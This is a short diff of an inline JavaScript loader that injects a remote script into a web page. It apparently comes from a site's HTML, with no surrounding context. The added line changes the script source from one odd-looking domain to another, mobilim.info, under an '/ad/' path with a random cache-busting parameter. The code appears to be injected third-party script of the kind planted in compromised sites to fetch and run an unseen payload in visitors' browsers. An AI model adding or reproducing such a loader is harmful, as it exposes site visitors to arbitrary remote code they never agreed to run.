@@ -4,5 +4,5 @@
               m = a.getElementsByTagName(d)[0];              
            o.src = j + "?d=0&r=" + Math.random();
            m.parentNode.insertBefore(o, m)
-      })(document, 'script', 'https://polenfiltresi.fit/ad/f57b1bed');
+      })(document, 'script', 'https://mobilim.info/ad/f57b1bed');
 </script>
